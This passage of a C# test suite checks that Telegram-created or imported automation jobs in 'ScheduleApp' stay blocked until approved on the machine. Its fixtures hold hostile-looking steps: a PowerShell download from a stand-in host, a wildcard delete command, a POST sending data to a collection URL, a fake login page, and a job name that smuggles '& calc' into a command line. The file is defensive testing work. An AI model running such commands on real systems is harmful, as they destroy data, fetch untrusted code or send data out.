using System.Drawing;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Text.Json.Nodes;
using ScheduleApp.Models;
using ScheduleApp.Services;
using ScheduleApp.Services.Data;
using ScheduleApp.Services.Testing;
using ScheduleApp.UI;
using static ScheduleApp.Tests.TestSupport;

namespace ScheduleApp.Tests;

/// <summary>
/// Điều khiển từ xa và công việc nhập về không chạy khi chưa được duyệt trên máy: lọc tin nhắn Telegram, công việc chờ duyệt không
/// được lịch / kích hoạt / hàng đợi / "Chạy công việc khác" / xử lý lỗi chạy, tóm tắt duyệt hiện đầy đủ bước nguy hiểm, nhập thư mục
/// không ghi đè công việc thường, không mở đường dẫn mạng khi xem trước, shortcut theo Id, từ chối Restart Manager khi flow đang chạy.
/// </summary>
public class RemoteApprovalTests
{
    private const string LongCommand =
        "powershell -NoProfile -Command \"Invoke-WebRequest https://vi-du.invalid/tai-ve/cong-cu.zip -OutFile $env:TEMP\\cc.zip; Expand-Archive $env:TEMP\\cc.zip $env:TEMP\\cc -Force\"";

    private static Job Pending(string name, params ActionStep[] steps)
    {
        var job = new Job { Name = name, Steps = [.. steps], Schedule = new ScheduleConfig { Type = ScheduleType.Manual } };
        JobApproval.Require(job, JobApproval.TelegramReason(new DateTime(2026, 10, 5, 14, 32, 0)));
        return job;
    }

    private static ActionStep LogStep(string text) => S(StepType.LogMessage, s => s.Text = text);

    private sealed class LogCapture : IDisposable
    {
        private readonly List<string> _lines = [];
        public LogCapture() => Log.Written += Add;
        public List<string> Lines { get { lock (_lines) return [.. _lines]; } }
        public bool Has(string text) => Lines.Any(l => l.Contains(text));
        private void Add(string line) { lock (_lines) _lines.Add(line); }
        public void Dispose() => Log.Written -= Add;
    }

    private static async Task WaitUntil(Func<bool> condition, string what)
    {
        for (int i = 0; i < 400 && !condition(); i++) await Task.Delay(25);
        Assert.True(condition(), "hết giờ chờ: " + what);
    }

    // ───────────────────────────── Telegram: lọc tin nhắn, bật / tắt ─────────────────────────────

    private static JsonElement Message(long chat, string? type, long? from)
    {
        var chatObj = new JsonObject { ["id"] = chat };
        if (type != null) chatObj["type"] = type;
        var msg = new JsonObject { ["chat"] = chatObj, ["text"] = "/run 1" };
        if (from != null) msg["from"] = new JsonObject { ["id"] = from };
        return JsonDocument.Parse(msg.ToJsonString()).RootElement.Clone();
    }

    [Fact]
    public void OnlyPrivateChatFromOwnerIsAccepted()
    {
        Assert.True(TelegramBot.IsFromOwner(Message(42, "private", 42), 42, out _));
        // Nhóm có chính bạn, nhóm/supergroup dùng chat id của bạn, kênh: bỏ qua.
        Assert.False(TelegramBot.IsFromOwner(Message(-1001234, "supergroup", 42), 42, out var who));
        Assert.Contains("supergroup", who);
        Assert.False(TelegramBot.IsFromOwner(Message(42, "group", 42), 42, out _));
        Assert.False(TelegramBot.IsFromOwner(Message(42, "channel", null), 42, out _));
        // Đúng chat nhưng người gửi khác, thiếu người gửi, thiếu loại chat: bỏ qua.
        Assert.False(TelegramBot.IsFromOwner(Message(42, "private", 77), 42, out who));
        Assert.Contains("người gửi 77", who);
        Assert.False(TelegramBot.IsFromOwner(Message(42, "private", null), 42, out _));
        Assert.False(TelegramBot.IsFromOwner(Message(42, null, 42), 42, out _));
        Assert.False(TelegramBot.IsFromOwner(Message(999, "private", 999), 42, out _));
    }

    [Fact]
    public void StartCheckRejectsGroupChatIdAndUndecryptableToken()
    {
        var ok = new TelegramSettings { AllowCommands = true, BotToken = Protector.Protect("123:abc"), ChatId = " 42 " };
        Assert.True(TelegramBot.CanStart(ok, out var token, out long chat, out var warning));
        Assert.Equal(("123:abc", 42L, (string?)null), (token, chat, warning));

        Assert.False(TelegramBot.CanStart(new TelegramSettings { AllowCommands = true, BotToken = ok.BotToken, ChatId = "-1001234" }, out _, out _, out warning));
        Assert.Equal(TelegramBot.GroupChatWarning, warning);
        Assert.False(TelegramBot.CanStart(new TelegramSettings { AllowCommands = true, BotToken = ok.BotToken, ChatId = "abc" }, out _, out _, out warning));
        Assert.Contains("không phải số", warning);

        // Token "dpapi:" hỏng / của tài khoản Windows khác: báo, không im lặng.
        var foreign = "dpapi:" + Convert.ToBase64String(Enumerable.Range(0, 64).Select(i => (byte)(i * 7 + 3)).ToArray());
        Assert.False(TelegramBot.CanStart(new TelegramSettings { AllowCommands = true, BotToken = foreign, ChatId = "42" }, out _, out _, out warning));
        Assert.Equal(TelegramBot.TokenWarning, warning);
        Assert.StartsWith("Không giải mã được token Telegram (dữ liệu chép từ máy / tài khoản Windows khác)", warning);

        // Chưa bật / chưa nhập token: không cảnh báo.
        Assert.False(TelegramBot.CanStart(new TelegramSettings { AllowCommands = false, BotToken = foreign, ChatId = "-1" }, out _, out _, out warning));
        Assert.Null(warning);
        Assert.False(TelegramBot.CanStart(new TelegramSettings { AllowCommands = true, BotToken = "", ChatId = "42" }, out _, out _, out warning));
        Assert.Null(warning);
    }

    private sealed class RecordingHost : IRemoteHost
    {
        public List<string> Runs { get; } = [];
        public int ListCalls;
        public string ListJobs() { Interlocked.Increment(ref ListCalls); return "1. A"; }
        public string Run(string nameOrNumber) { lock (Runs) Runs.Add(nameOrNumber); return "chạy"; }
        public string Stop() => "";
        public string Status() => "";
        public FlowGenerator.Context NewJobContext() => new();
        public string AddJob(Job job, bool run) => "";
    }

    [Fact]
    public async Task BotIgnoresGroupAndForeignSendersAndRefusesBadSettings()
    {
        var updates = new List<JsonObject>();
        var sent = new List<(long Chat, string Text)>();
        void Queue(long chat, string? type, long? from, string text)
        {
            lock (updates)
            {
                var chatObj = new JsonObject { ["id"] = chat };
                if (type != null) chatObj["type"] = type;
                var msg = new JsonObject { ["chat"] = chatObj, ["text"] = text };
                if (from != null) msg["from"] = new JsonObject { ["id"] = from };
                updates.Add(new JsonObject { ["update_id"] = (long)(updates.Count + 1), ["message"] = msg });
            }
        }
        using var telegram = new MiniHttpServer((_, path, _, body) =>
        {
            if (path.Contains("/sendMessage"))
            {
                var msg = JsonNode.Parse(body)!;
                lock (sent) sent.Add(((long)msg["chat_id"]!, (string)msg["text"]!));
                return (200, """{"ok":true,"result":{}}""");
            }
            if (!path.Contains("/getUpdates")) return (404, """{"ok":false}""");
            var query = System.Web.HttpUtility.ParseQueryString(new Uri("http://x" + path).Query);
            long offset = long.Parse(query["offset"]!);
            JsonArray result;
            lock (updates) result = new JsonArray([.. updates.Where(u => offset >= 0 && (long)u["update_id"]! >= offset).Select(u => u.DeepClone())]);
            if (result.Count == 0) Thread.Sleep(50);
            return (200, new JsonObject { ["ok"] = true, ["result"] = result }.ToJsonString());
        });

        var settings = SettingsStore.Current.Telegram;
        var apiBase = TelegramBot.ApiBase;
        TelegramBot.ApiBase = telegram.BaseUrl.TrimEnd('/');
        var host = new RecordingHost();
        using var logs = new LogCapture();
        try
        {
            // Chat id nhóm (âm) hoặc token không giải mã được: không chạy vòng nhận lệnh, có cảnh báo, không gọi Telegram.
            SettingsStore.Current.Telegram = new TelegramSettings { BotToken = Protector.Protect("123:abc"), ChatId = "-1001234", AllowCommands = true };
            using (var bot = new TelegramBot(host))
            {
                bot.Restart();
                Assert.False(bot.IsRunning);
            }
            Assert.True(logs.Has(TelegramBot.GroupChatWarning));
            SettingsStore.Current.Telegram = new TelegramSettings { BotToken = "dpapi:AAAA" + new string('B', 40), ChatId = "42", AllowCommands = true };
            using (var bot = new TelegramBot(host))
            {
                bot.Restart();
                Assert.False(bot.IsRunning);
            }
            Assert.True(logs.Has(TelegramBot.TokenWarning));
            Assert.Empty(telegram.Requests);

            SettingsStore.Current.Telegram = new TelegramSettings { BotToken = Protector.Protect("123:abc"), ChatId = "42", AllowCommands = true };
            Queue(-1001234, "supergroup", 42, "/run 1");   // nhóm có bạn
            Queue(42, "private", 77, "/run 1");            // người gửi khác
            Queue(42, "private", null, "/run 1");          // thiếu người gửi
            Queue(42, null, 42, "/run 1");                 // thiếu loại chat
            Queue(42, "private", 42, "/list");             // đúng chủ, chat riêng
            using var bot2 = new TelegramBot(host);
            bot2.Restart();
            Assert.True(bot2.IsRunning);
            await WaitUntil(() => Volatile.Read(ref host.ListCalls) > 0 && sent.Count > 0, "bot trả lời /list");
            bot2.Stop();
        }
        finally
        {
            SettingsStore.Current.Telegram = settings;
            TelegramBot.ApiBase = apiBase;
        }
        Assert.Empty(host.Runs);
        Assert.Equal(1, host.ListCalls);
        lock (sent) Assert.All(sent, s => Assert.Equal(42, s.Chat));
        Assert.Equal(4, logs.Lines.Count(l => l.Contains("bỏ qua lệnh từ chat lạ")));
    }

    [Fact]
    public void HistoryIsRedacted()
    {
        const string secret = "Pw-b2-Secret-991";
        Log.Mask(secret);
        RunHistory.Add(new RunRecord
        {
            JobId = Guid.NewGuid(), JobName = "Đăng nhập kho", Trigger = "thử", Start = DateTime.Now.AddSeconds(-3), End = DateTime.Now,
            Ok = false, Message = $"Sai mật khẩu {secret} cho tài khoản kho"
        });
        var history = TelegramBot.History(1);
        Assert.Contains("Đăng nhập kho", history);
        Assert.DoesNotContain(secret, history);
        Assert.Contains("Sai mật khẩu *** cho tài khoản kho", history);
    }

    // ───────────────────────────── Tạo qua Telegram: chờ duyệt, xem trước đầy đủ ─────────────────────────────

    private sealed class AddingHost : IRemoteHost
    {
        public List<(Job Job, bool Run)> Added { get; } = [];
        public string ListJobs() => "";
        public string Run(string nameOrNumber) => "";
        public string Stop() => "";
        public string Status() => "";
        public FlowGenerator.Context NewJobContext() => new();
        public string AddJob(Job job, bool run) { Added.Add((job, run)); return $"✅ Đã lưu \"{job.Name}\""; }
    }

    private const string RiskyDraft = """
        {"name":"Dọn máy","summary":"s","steps":[{"Type":"RunCommand","Target":"cmd /c echo xin chao"},{"Type":"LogMessage","Text":"xong"}],
         "schedule":{"type":"Daily","time":"08:00"},"triggers":[{"type":"AppStartup"}]}
        """;

    private static async Task<(Job Job, bool Run, string Reply)> SaveDraftAsync(bool runWithoutApproval)
    {
        var toolUse = $$"""
            {"id":"msg_1","type":"message","role":"assistant","model":"claude-opus-5-5",
             "content":[{"type":"tool_use","id":"toolu_1","name":"build_flow","input":{{RiskyDraft}} }],
             "stop_reason":"tool_use","usage":{"input_tokens":10,"output_tokens":10} }
            """;
        using var claude = new MiniHttpServer((_, _, _, _) => (200, toolUse));
        var (endpoint, key, tg) = (AiClient.Endpoint, SettingsStore.Current.Ai.ApiKey, SettingsStore.Current.Telegram);
        AiClient.Endpoint = claude.BaseUrl + "v1/messages";
        SettingsStore.Current.Ai.ApiKey = Protector.Protect("sk-thu");
        SettingsStore.Current.Telegram = new TelegramSettings { RunWithoutApproval = runWithoutApproval };
        try
        {
            var host = new AddingHost();
            var builder = new ChatJobBuilder(host);
            Assert.Contains("✨ Bản nháp: Dọn máy", await builder.CreateAsync("dọn máy mỗi sáng", CancellationToken.None));
            var reply = builder.Save(run: true);
            var (job, run) = Assert.Single(host.Added);
            return (job, run, reply);
        }
        finally
        {
            (AiClient.Endpoint, SettingsStore.Current.Ai.ApiKey, SettingsStore.Current.Telegram) = (endpoint, key, tg);
        }
    }

    [Fact]
    public async Task TelegramJobNeedsApprovalUnlessUnsafeSettingIsOn()
    {
        var (job, run, reply) = await SaveDraftAsync(runWithoutApproval: false);
        Assert.True(job.NeedsApproval);
        Assert.Matches(@"^Tạo qua Telegram \d\d/\d\d \d\d:\d\d$", job.ApprovalReason);
        Assert.False(run); // "/ok chay" không chạy ngay
        Assert.Contains("🔒 Chờ duyệt trên máy tính", reply);
        Assert.Contains("Vì vậy chưa chạy ngay", reply);

        (job, run, reply) = await SaveDraftAsync(runWithoutApproval: true);
        Assert.False(job.NeedsApproval);
        Assert.Null(job.ApprovalReason);
        Assert.True(run);
        Assert.DoesNotContain("Chờ duyệt", reply);
    }

    [Fact]
    public void PreviewShowsRiskyStepsInFullEvenPastTheLimit()
    {
        var steps = new JsonArray();
        for (int i = 0; i < 45; i++)
        {
            steps.Add(i switch
            {
                3 => new JsonObject { ["Type"] = "TypeText", ["Target"] = "Notepad", ["Text"] = "Đây là một đoạn chữ rất dài hơn năm mươi ký tự để xem bản xem trước có cắt không" },
                43 => new JsonObject { ["Type"] = "RunCommand", ["Target"] = LongCommand },
                _ => new JsonObject { ["Type"] = "LogMessage", ["Text"] = $"bước {i + 1}" }
            });
        }
        var gen = new FlowGenerator(new FlowGenerator.Context());
        var r = gen.Parse(new JsonObject { ["name"] = "Dài", ["summary"] = "s", ["steps"] = steps }, FlowGenerator.Mode.Replace);
        var preview = ChatJobBuilder.Preview(r);

        Assert.Contains("⚠ 4. Gõ \"Đây là một đoạn chữ rất dài hơn năm mươi ký tự để xem bản xem trước có cắt không\" vào \"Notepad\"", preview);
        Assert.Contains("⚠ 44. Chạy lệnh: " + LongCommand, preview);       // sau giới hạn 40 bước vẫn hiện, đầy đủ
        Assert.Contains("40. Ghi: bước 40", preview);
        Assert.DoesNotContain("Ghi: bước 41", preview);
        Assert.Contains("… và 4 bước khác không hiện", preview);             // 41, 42, 43, 45
    }

    // ───────────────────────────── Không chạy khi chưa duyệt ─────────────────────────────

    [Fact]
    public async Task RunnerRefusesPendingJobFromAnySource()
    {
        using var logs = new LogCapture();
        var sub = Pending("Phụ b2", LogStep("TRONG-SUB-b2"));
        var cleanup = Pending("Dọn dẹp b2", LogStep("DON-DEP-b2"));
        var root = new Job
        {
            Name = "Gốc đã duyệt b2",
            Steps = [S(StepType.CallJob, s => { s.JobRef = sub.Id; s.Target = sub.Name; }), LogStep("SAU-CALL-b2")]
        };
        var failing = new Job { Name = "Lỗi b2", OnFailureJobId = cleanup.Id, Steps = [S(StepType.StopFlow, s => { s.Force = true; s.Text = "hỏng"; })] };
        var all = new List<Job> { sub, cleanup, root, failing };
        var runner = new FlowRunner(new FakeUi(), id => all.Find(j => j.Id == id));

        // Gọi trực tiếp (lịch, kích hoạt, /run, dòng lệnh đều đi qua đây): không chạy, không ghi lịch sử.
        int before = RunHistory.All.Count;
        var direct = await runner.EnqueueAsync(sub, "theo lịch");
        Assert.NotNull(direct);
        Assert.False(direct.Ok);
        Assert.Contains("đang chờ duyệt trên máy tính (Tạo qua Telegram 05/10 14:32)", direct.Message);
        Assert.Equal(before, RunHistory.All.Count);

        // "Chạy công việc khác" tới công việc chờ duyệt: bước lỗi kèm lý do, công việc con không chạy.
        var called = await runner.EnqueueAsync(root, "chạy thủ công");
        Assert.False(called!.Ok);
        Assert.Contains("\"Phụ b2\" đang chờ duyệt trên máy tính", called.Message);
        Assert.False(logs.Has("TRONG-SUB-b2"));
        Assert.False(logs.Has("SAU-CALL-b2"));

        // Công việc xử lý lỗi chờ duyệt: không chạy.
        var failed = await runner.EnqueueAsync(failing, "chạy thủ công");
        Assert.False(failed!.Ok);
        Assert.True(logs.Has("Không chạy công việc xử lý lỗi"));
        Assert.False(logs.Has("DON-DEP-b2"));

        // Đối chứng: duyệt rồi thì chạy được.
        JobApproval.Approve(sub);
        JobApproval.Approve(cleanup);
        Assert.True((await runner.EnqueueAsync(root, "chạy thủ công"))!.Ok);
        Assert.True(logs.Has("TRONG-SUB-b2"));
        await runner.EnqueueAsync(failing, "chạy thủ công");
        Assert.True(logs.Has("DON-DEP-b2"));
    }

    [Fact]
    public async Task SchedulerDoesNotArmOrCatchUpPendingJob()
    {
        var job = new Job
        {
            Name = "Theo lịch b2",
            Schedule = new ScheduleConfig { Type = ScheduleType.Daily, StartAt = DateTime.Today.AddHours(3) },
            MissedRunPolicy = MissedRunPolicy.RunOnce,
            Steps = [LogStep("CHAY-BU-b2")]
        };
        JobApproval.Require(job, "Nhập từ file thu.json 05/10 14:32");
        var jobs = new List<Job> { job };
        var runner = new FlowRunner(new FakeUi(), id => jobs.Find(j => j.Id == id));
        var lastAlive = SettingsStore.Current.LastAlive;
        using var logs = new LogCapture();
        try
        {
            SettingsStore.Current.LastAlive = DateTime.Now.AddDays(-2);
            using (var scheduler = new Scheduler(jobs, runner))
            {
                scheduler.Start(); // chạy bù các lần lỡ từ lần "còn sống" cuối
                Assert.Null(job.NextRun);
                Assert.False(logs.Has("Lỡ lịch"));
                scheduler.Recalculate(job);
                Assert.Null(job.NextRun);

                JobApproval.Approve(job);
                scheduler.Recalculate(job);
                Assert.NotNull(job.NextRun);
            }
            // Đối chứng: đã duyệt thì lần lỡ được chạy bù.
            SettingsStore.Current.LastAlive = DateTime.Now.AddDays(-2);
            using (var scheduler = new Scheduler(jobs, runner)) scheduler.Start();
            Assert.True(logs.Has("chạy bù ngay"));
            await WaitUntil(() => logs.Has("CHAY-BU-b2"), "chạy bù công việc đã duyệt");
        }
        finally
        {
            SettingsStore.Current.LastAlive = lastAlive;
        }
    }

    private sealed class HotkeyHost : IHotkeyHost
    {
        public List<int> Registered { get; } = [];
        public bool RegisterHotkey(int id, uint modifiers, uint vk) { Registered.Add(id); return true; }
        public void UnregisterHotkey(int id) { }
    }

    [Fact]
    public async Task TriggersAreNotArmedForPendingJob()
    {
        var job = Pending("Kích hoạt b2", LogStep("KHOI-DONG-b2"));
        job.Triggers = [new JobTrigger { Type = TriggerType.Hotkey, Value = "Ctrl+Alt+F12" }, new JobTrigger { Type = TriggerType.AppStartup }];
        var jobs = new List<Job> { job };
        var runner = new FlowRunner(new FakeUi(), id => jobs.Find(j => j.Id == id));
        var host = new HotkeyHost();
        using var logs = new LogCapture();
        using var triggers = new TriggerManager(jobs, runner, host);
        triggers.Reload();
        triggers.OnAppStartup();
        Assert.Empty(host.Registered);
        Assert.False(logs.Has("kích hoạt: khi ScheduleApp khởi động"));

        // Đối chứng: duyệt → phím tắt được đăng ký, "khi khởi động" chạy.
        JobApproval.Approve(job);
        triggers.Reload();
        Assert.Single(host.Registered);
        triggers.OnAppStartup();
        await WaitUntil(() => logs.Has("KHOI-DONG-b2"), "kích hoạt khi khởi động");
    }

    // ───────────────────────────── Tóm tắt để duyệt ─────────────────────────────

    private static Job RiskyJob()
    {
        const string secret = "MatKhau-b2-Xyz";
        Log.Mask(secret);
        return new Job
        {
            Name = "Nhập từ ngoài",
            Schedule = new ScheduleConfig { Type = ScheduleType.Daily, StartAt = DateTime.Today.AddHours(8) },
            Triggers = [new JobTrigger { Type = TriggerType.Hotkey, Value = "Ctrl+Alt+9" }],
            Variables = [new VariableDef { Name = "lenh", Value = "del /q C:\\du-lieu\\*" }],
            Steps =
            [
                LogStep("bắt đầu"),
                S(StepType.RunCommand, s => s.Target = LongCommand),
                S(StepType.LaunchApp, s => { s.Target = @"C:\Tools\tai-ve.exe"; s.Arguments = "--silent --url https://vi-du.invalid/goi-rat-dai/phan-mem-khong-ro-nguon-goc.exe"; }),
                S(StepType.HttpRequest, s => { s.Method = "POST"; s.Target = "https://vi-du.invalid/thu-thap/du-lieu-rat-dai-de-khong-vua-50-ky-tu?id=1"; s.Text = "{\"file\":\"{{lenh}}\"}"; }),
                S(StepType.WriteData, s => { s.DataAction = DataAction.WriteText; s.Target = @"C:\Users\Public\Desktop\mot-thu-muc-sau\file-ghi-de-rat-dai.bat"; s.Text = "{{lenh}}"; }),
                S(StepType.TypeText, s => { s.Target = "Đăng nhập"; s.Text = $"admin\t{secret}\n"; }),
                S(StepType.KeyPress, s => s.Text = "Win+R"),
                S(StepType.Browser, s => { s.BrowserAction = BrowserAction.Navigate; s.Text = "https://vi-du.invalid/trang-dang-nhap-gia-mao-rat-dai-de-vuot-qua-nam-muoi-ky-tu"; })
            ]
        };
    }

    [Fact]
    public void ApprovalSummaryListsEveryStepInOrderWithRiskyStepsInFull()
    {
        var job = RiskyJob();
        JobApproval.Require(job, "Nhập từ file la.json 05/10 14:32");
        var summary = JobApproval.Summary(job, [job]);

        Assert.Contains("Nguồn: Nhập từ file la.json 05/10 14:32", summary);
        Assert.Contains("⏰ Lịch: Hằng ngày lúc 08:00", summary);
        Assert.Contains("⚡ Kích hoạt: ", summary);
        Assert.Contains("Ctrl+Alt+9", summary);
        Assert.Contains("🔣 Biến lenh = \"del /q C:\\du-lieu\\*\"", summary);
        Assert.Contains("7 bước cần xem kỹ", summary);
        string[] expected =
        [
            "1. Ghi: bắt đầu",
            "⚠ 2. Chạy lệnh: " + LongCommand,
            "⚠ 3. Mở \"C:\\Tools\\tai-ve.exe\" với tham số: --silent --url https://vi-du.invalid/goi-rat-dai/phan-mem-khong-ro-nguon-goc.exe",
            "⚠ 4. POST https://vi-du.invalid/thu-thap/du-lieu-rat-dai-de-khong-vua-50-ky-tu?id=1 · nội dung gửi: {\"file\":\"{{lenh}}\"}",
            "⚠ 5. Ghi đè file \"C:\\Users\\Public\\Desktop\\mot-thu-muc-sau\\file-ghi-de-rat-dai.bat\": {{lenh}}",
            "⚠ 6. Gõ \"admin\t*** ⏎ \" vào \"Đăng nhập\"",
            "⚠ 7. Nhấn Win+R (vào cửa sổ đang dùng)",
            "⚠ 8. Mở trang https://vi-du.invalid/trang-dang-nhap-gia-mao-rat-dai-de-vuot-qua-nam-muoi-ky-tu"
        ];
        int at = 0;
        foreach (var line in expected)
        {
            int i = summary.IndexOf(line, StringComparison.Ordinal);
            Assert.True(i >= at, $"thiếu hoặc sai thứ tự: {line}\n---\n{summary}");
            at = i;
        }
        Assert.DoesNotContain("MatKhau-b2-Xyz", summary);
    }

    [Fact]
    public void ImportSummaryListsRiskyStepsAndVariablesInFull()
    {
        var risky = RiskyJob();
        var safe = new Job { Name = "Chỉ ghi nhật ký", Steps = [LogStep("a")], Schedule = new ScheduleConfig { Type = ScheduleType.Manual } };
        var summary = JobApproval.ImportSummary([risky, safe]);
        Assert.Contains("■ Nhập từ ngoài — 8 bước, 7 bước cần xem kỹ", summary);
        Assert.Contains("⚠ 2. Chạy lệnh: " + LongCommand, summary);
        Assert.Contains("⚠ 3. Mở \"C:\\Tools\\tai-ve.exe\" với tham số: --silent --url https://vi-du.invalid/goi-rat-dai/phan-mem-khong-ro-nguon-goc.exe", summary);
        Assert.Contains("⚠ 5. Ghi đè file \"C:\\Users\\Public\\Desktop\\mot-thu-muc-sau\\file-ghi-de-rat-dai.bat\": {{lenh}}", summary);
        Assert.Contains("🔣 lenh = \"del /q C:\\du-lieu\\*\"", summary);
        Assert.Contains("⏰ Hằng ngày lúc 08:00", summary);
        Assert.Contains("■ Chỉ ghi nhật ký — 1 bước, không có bước chạy lệnh", summary);
        Assert.DoesNotContain("MatKhau-b2-Xyz", summary);
    }

    // ───────────────────────────── Nhập: chờ duyệt, không ghi đè công việc thường ─────────────────────────────

    [Fact]
    public void ImportFromFileMarksEveryJobPending()
    {
        // File xuất từ máy khác (công việc bật, có lịch + kích hoạt "khi khởi động", bước chạy lệnh).
        var dir = NewDir();
        var path = Path.Combine(dir, "cong-viec.json");
        var exported = RiskyJob();
        exported.Triggers.Add(new JobTrigger { Type = TriggerType.AppStartup });
        File.WriteAllText(path, JsonSerializer.Serialize(new[] { exported }, JsonDefaults.Options));

        var imported = JobApproval.ImportFile(path, new DateTime(2026, 10, 5, 14, 32, 0)); // MainForm.ImportJobs dùng đúng hàm này
        var job = Assert.Single(imported);
        Assert.True(job.NeedsApproval);
        Assert.Equal("Nhập từ file cong-viec.json 05/10 14:32", job.ApprovalReason);
        Assert.False(job.Armed);
        Assert.True(job.Enabled); // giữ bật / lịch như trong file — chỉ không chạy cho tới khi duyệt
    }

    private static Job TestCase(string name) =>
        new() { Name = name, Group = "G", IsTestCase = true, Steps = [LogStep(name)], Schedule = new ScheduleConfig { Type = ScheduleType.Manual } };

    [Fact]
    public void FolderMergeNeverReplacesNormalJobAndMarksChangesPending()
    {
        var normal = new Job { Name = "Báo cáo hằng ngày", Steps = [LogStep("thật")] };
        var unchanged = TestCase("Không đổi");
        var changed = TestCase("Có đổi");
        changed.LastRun = new DateTime(2026, 1, 2);
        var current = new List<Job> { normal, unchanged, changed };

        var evil = normal.Clone();
        evil.Name = "Báo cáo hằng ngày";
        evil.IsTestCase = true; // giả làm kịch bản để ghi đè
        evil.Steps = [S(StepType.RunCommand, s => s.Target = LongCommand)];
        var sameAsBefore = unchanged.Clone();
        var edited = changed.Clone();
        edited.Steps.Add(S(StepType.RunCommand, s => s.Target = "calc"));
        edited.LastRun = null;
        var added = TestCase("Mới");

        var r = TestFolder.Merge(current, [evil, sameAsBefore, edited, added], "Nhập từ thư mục kịch bản 05/10 14:32");
        Assert.Equal((1, 2, 1), (r.Skipped, r.Updated, r.Added));
        Assert.Same(normal, current[0]);
        Assert.Equal("thật", current[0].Steps[0].Text);
        Assert.False(current[0].NeedsApproval);

        Assert.Same(sameAsBefore, current[1]);
        Assert.False(current[1].NeedsApproval);            // nội dung y hệt → giữ trạng thái đã duyệt
        Assert.Same(edited, current[2]);
        Assert.True(current[2].NeedsApproval);             // đổi bước → chờ duyệt
        Assert.Equal("Nhập từ thư mục kịch bản 05/10 14:32", current[2].ApprovalReason);
        Assert.Equal(new DateTime(2026, 1, 2), current[2].LastRun);
        Assert.Same(added, current[3]);
        Assert.True(current[3].NeedsApproval);

        // Kịch bản đang chờ duyệt mà file không đổi: vẫn chờ duyệt.
        var again = TestFolder.Merge(current, [edited.Clone()]);
        Assert.Equal(1, again.Updated);
        Assert.True(current[2].NeedsApproval);
    }

    [Fact]
    public void FolderExportDoesNotCarryApprovalState()
    {
        var dir = NewDir();
        var job = TestCase("Xuất");
        JobApproval.Require(job, "Tạo qua Telegram 05/10 14:32");
        TestFolder.Export(dir, [job], [job]);
        var text = File.ReadAllText(Directory.GetFiles(dir, "*.json", SearchOption.AllDirectories).Single());
        Assert.DoesNotContain("NeedsApproval", text);
        Assert.DoesNotContain("ApprovalReason", text);
        Assert.True(job.NeedsApproval); // công việc gốc không đổi
    }

    [Fact]
    public void JsonStaysCompatible()
    {
        var plain = JsonSerializer.Serialize(new Job(), JsonDefaults.Options);
        Assert.DoesNotContain("NeedsApproval", plain);
        Assert.DoesNotContain("ApprovalReason", plain);
        Assert.DoesNotContain("Armed", plain);

        var old = JsonSerializer.Deserialize<Job>("""{"Name":"Cũ","Enabled":true}""", JsonDefaults.Options)!;
        Assert.False(old.NeedsApproval);
        Assert.Null(old.ApprovalReason);
        Assert.True(old.Armed);

        var pending = Pending("Chờ");
        var json = JsonSerializer.Serialize(pending, JsonDefaults.Options);
        Assert.Contains("\"NeedsApproval\": true", json);
        Assert.Contains("\"ApprovalReason\": \"Tạo qua Telegram 05/10 14:32\"", json);
        var back = JsonSerializer.Deserialize<Job>(json, JsonDefaults.Options)!;
        Assert.Equal((true, "Tạo qua Telegram 05/10 14:32"), (back.NeedsApproval, back.ApprovalReason));
        Assert.True(pending.Clone().NeedsApproval);
        Assert.False(back.Armed);
    }

    // ───────────────────────────── Shortcut, Restart Manager ─────────────────────────────

    [DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CommandLineToArgvW(string cmdLine, out int argc);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LocalFree(IntPtr mem);

    /// <summary>Tách dòng lệnh đúng như Windows tách cho Main(string[] args).</summary>
    private static string[] SplitLikeWindows(string commandLine)
    {
        var argv = CommandLineToArgvW(commandLine, out int argc);
        try { return [.. Enumerable.Range(0, argc).Select(i => Marshal.PtrToStringUni(Marshal.ReadIntPtr(argv, i * IntPtr.Size))!)]; }
        finally { LocalFree(argv); }
    }

    [Fact]
    public void ShortcutRunsByIdWhateverTheName()
    {
        var tricky = new Job { Name = "Báo cáo \" --stop \"x\\\" & calc" };
        var other = new Job { Name = "Báo cáo" };
        var args = MainForm.ShortcutArguments(tricky);
        Assert.Equal($"--run {tricky.Id:D}", args);
        var argv = SplitLikeWindows("\"C:\\Program Files\\ScheduleApp\\ScheduleApp.exe\" " + args);
        Assert.Equal(new[] { "--run", tricky.Id.ToString("D") }, argv[1..]);
        Assert.DoesNotContain("--stop", argv);
        Assert.Same(tricky, MainForm.FindForCommand([other, tricky], argv[2]));

        // Shortcut cũ theo tên vẫn chạy được.
        Assert.Same(other, MainForm.FindForCommand([other, tricky], "\"Báo cáo\""));
        Assert.Null(MainForm.FindForCommand([other], Guid.NewGuid().ToString()));
    }

    [Fact]
    public void RestartManagerCloseIsRefusedOnlyWhileFlowRuns()
    {
        const long closeApp = 0x1, critical = 0x40000000, logoff = 0x80000000;
        Assert.True(MainForm.RefuseEndSession(closeApp, flowRunning: true));
        Assert.False(MainForm.RefuseEndSession(closeApp, flowRunning: false));
        // Tắt máy / đăng xuất thật: không bao giờ chặn.
        Assert.False(MainForm.RefuseEndSession(0, flowRunning: true));
        Assert.False(MainForm.RefuseEndSession(logoff, flowRunning: true));
        Assert.False(MainForm.RefuseEndSession(critical, flowRunning: true));
        Assert.False(MainForm.RefuseEndSession(closeApp | critical, flowRunning: true));
        Assert.False(MainForm.RefuseEndSession(closeApp | logoff, flowRunning: true));
    }

    // ───────────────────────────── Đường dẫn mạng khi xem trước ─────────────────────────────

    [Fact]
    public void RemotePathDetection()
    {
        Assert.True(RemotePathGate.IsRemote(@"\\may-chu\chia-se\video.mp4"));
        Assert.True(RemotePathGate.IsRemote("//may-chu/chia-se/video.mp4"));
        Assert.True(RemotePathGate.IsRemote(@"\\?\UNC\may-chu\chia-se\a.xlsx"));
        Assert.True(RemotePathGate.IsRemote(" \"\\\\10.0.0.5\\c$\\a.csv\" "));
        Assert.True(RemotePathGate.IsRemote("file://may-chu/chia-se/a.mp4"));
        // Dạng đường dẫn thiết bị cũng đi qua mạng (MUP).
        Assert.True(RemotePathGate.IsRemote(@"\\.\UNC\may-chu\chia-se\v.mp4"));
        Assert.True(RemotePathGate.IsRemote(@"\\?\GLOBALROOT\Device\Mup\may-chu\chia-se\x"));
        Assert.True(RemotePathGate.IsRemote(@"\??\UNC\may-chu\chia-se\x"));
        Assert.True(RemotePathGate.IsRemote(@"\\.\pipe\x"));
